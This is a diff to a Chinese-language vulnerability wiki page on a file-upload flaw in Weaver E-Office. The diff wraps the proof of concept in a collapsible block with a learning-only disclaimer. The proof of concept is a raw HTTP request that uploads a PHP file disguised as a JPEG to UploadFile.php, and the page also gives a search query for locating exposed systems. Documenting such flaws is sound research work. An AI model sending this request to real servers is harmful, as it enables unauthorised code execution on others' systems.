@@ -26,8 +26,10 @@ tags:
 
 ```
 app="泛微-EOffice"
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 ## 漏洞复现
 
 登录页面
@@ -37,7 +39,7 @@ app="泛微-EOffice"
 发送请求包
 
 ```SS
-POST /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId= HTTP/1.1
+POST /general/index/UploadFile.php?m=uploadPicture&amp;uploadType=eoffice_logo&amp;userId= HTTP/1.1
 Host: 
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
 Accept-Encoding: gzip, deflate
@@ -52,10 +54,11 @@ Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4
 Content-Disposition: form-data; name="Filedata"; filename="test.php"
 Content-Type: image/jpeg
 
-<?php phpinfo();?>
+&lt;?php phpinfo();?&gt;
 
---e64bdf16c554bbc109cecef6451c26a4--
-```
+--e64bdf16c554bbc109cecef6451c26a4--</code></pre>
+
+</details>
 
 ![image-20220520134342019](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201343075.png)
 
